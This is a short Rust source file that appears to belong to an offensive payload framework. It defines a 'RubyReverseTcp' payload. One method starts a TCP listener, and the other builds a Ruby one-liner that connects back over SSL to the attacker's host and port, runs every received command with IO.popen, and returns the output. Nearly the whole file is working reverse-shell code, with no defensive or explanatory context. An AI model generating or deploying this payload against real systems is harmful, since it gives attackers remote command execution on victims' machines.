use crate::core::{
    handler::generic_tcp_handler::GenericTcpHandler,
    payload::{reverse::Reverse, Payload},
};

// TODO: maybe can remove public
pub struct RubyReverseTcp {
    pub reverse: Reverse,
}

impl Payload for RubyReverseTcp {
    fn pretask(&self) -> Result<(), Box<dyn std::error::Error>> {
        let mut handler = GenericTcpHandler::new(&self.reverse.lhost, &self.reverse.lport)?;
        handler.listen_for_one()?;
        Ok(())
    }

    fn blob(&self) -> Vec<u8> {
        let blob = format!("require 'socket';require 'openssl';c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new(\"{}\",\"{}\")).connect;while(cmd=c.gets);IO.popen(cmd.to_s,\"r\"){{|io|c.print io.read}}end", self.reverse.lhost, self.reverse.lport);
        blob.into_bytes()
    }
}
